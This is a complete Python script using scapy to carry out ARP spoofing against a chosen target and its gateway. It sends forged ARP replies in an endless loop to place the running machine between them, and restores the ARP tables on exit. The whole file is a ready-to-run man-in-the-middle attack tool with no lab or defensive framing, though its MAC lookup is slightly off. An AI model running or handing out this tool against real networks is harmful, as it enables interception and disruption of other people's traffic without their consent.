# !/usr/bin/env python

import re
import time
import argparse
import subprocess
import scapy.all as scapy

def get_gateway():
    result = subprocess.check_output(["ip", "r"])
    gateway_result = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", str(result))
    return gateway_result.group(0)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="Target", help="Target system IP address")
    parser.add_argument("-g", "--gateway", dest="Gateway", help="Gateway IP address of the network")
    options = parser.parse_args()
    if not options.Target:
        parser.error("[-] Please enter the correct target IP address")
    if not options.Gateway:
        ip = get_gateway()
        print(f"[-] No gateway IP mentioned, using the default gateway {ip}")
        options.Gateway = ip
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def foolYou(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(gateway), psrc=gateway)
    scapy.send(packet, verbose=False)

def saveYou(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(gateway), psrc=gateway, hwsrc=get_mac(gateway))
    scapy.send(packet, verbose=False, count=10)

user_input = get_arguments()
try:
    packets_sent = 0
    print(f"[+] Target IP address: {user_input.Target}")
    print(f"[+] Gateway IP address: {user_input.Gateway}")
    while True:
        foolYou(user_input.Target, user_input.Gateway)
        foolYou(user_input.Gateway, user_input.Target)
        packets_sent += 2
        print(f"\r[+] Packets sent: {packets_sent}", end="")
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[-] Keyboard Interruption detected...quitting the program")
    print("[-] Restoring the arp table values in target system")
    saveYou(user_input.Target, user_input.Gateway)
    saveYou(user_input.Gateway, user_input.Target)